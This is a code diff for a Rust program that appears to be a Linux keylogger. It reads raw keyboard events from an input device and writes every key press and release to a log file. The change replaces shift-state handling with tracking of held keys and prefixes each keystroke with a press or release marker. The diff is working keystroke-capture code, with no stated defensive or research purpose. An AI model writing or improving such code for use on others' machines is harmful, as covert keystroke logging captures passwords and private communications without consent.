@@ -7,7 +7,7 @@ extern crate log;
 
 mod input;
 
-use input::{is_key_event, is_key_press, is_key_release, is_shift, get_key_text, InputEvent};
+use input::{is_key_event, is_key_press, is_key_release, get_key_text, InputEvent};
 
 use std::process::{exit, Command};
 use std::fs::{File, OpenOptions};
@@ -45,9 +45,9 @@ fn main() {
     // TODO: use the sizeof function (not available yet) instead of hard-coding 24.
     let mut buf: [u8; 24] = unsafe { mem::zeroed() };
 
-    // We use a u8 here instead of a bool to handle the rare case when both shift keys are pressed
-    // and then one is released
-    let mut shift_pressed = 0;
+    let mut last_change = 0;
+    let mut holding_down = Vec::new();
+
     loop {
         let num_bytes = device_file.read(&mut buf).unwrap_or_else(|e| panic!("{}", e));
         if num_bytes != mem::size_of::<InputEvent>() {
@@ -56,23 +56,35 @@ fn main() {
         let event: InputEvent = unsafe { mem::transmute(buf) };
         if is_key_event(event.type_) {
             if is_key_press(event.value) {
-                if is_shift(event.code) {
-                    shift_pressed += 1;
+                if last_change + 1 == holding_down.len() {
+                    print_key(*holding_down.last().unwrap(), '+', &mut log_file);
                 }
-
-                let text = get_key_text(event.code, shift_pressed).as_bytes();
-                let num_bytes = log_file.write(text).unwrap_or_else(|e| panic!("{}", e));
-
-                if num_bytes != text.len() {
-                    panic!("Error while writing to log file");
-                }
+                last_change = holding_down.len();
+                holding_down.push(event.code);
             } else if is_key_release(event.value) {
-                if is_shift(event.code) {
-                    shift_pressed -= 1;
-                }
+                if let Some(position) = holding_down.iter()
+                    .position(|x| *x == event.code) {
+                        if position + 1 == holding_down.len() {
+                            if last_change > position {
+                                print_key(event.code, '-', &mut log_file);
+                            } else {
+                                print_key(event.code, '±', &mut log_file);
+                            }
+                            holding_down.pop();
+                        } else {
+                            print_key(*holding_down.last().unwrap(), '+', &mut log_file);
+                            print_key(event.code, '-', &mut log_file);
+                            holding_down.remove(position);
+                        }
+                    }
             }
         }
     }
+}
+
+fn print_key(code: u16, sign: char, file: &mut File) {
+    let text = get_key_text(code);
+    write!(file, "<{}>{}", sign, text).unwrap_or_else(|e| panic!("{}", e));
 }
 
 fn root_check() {
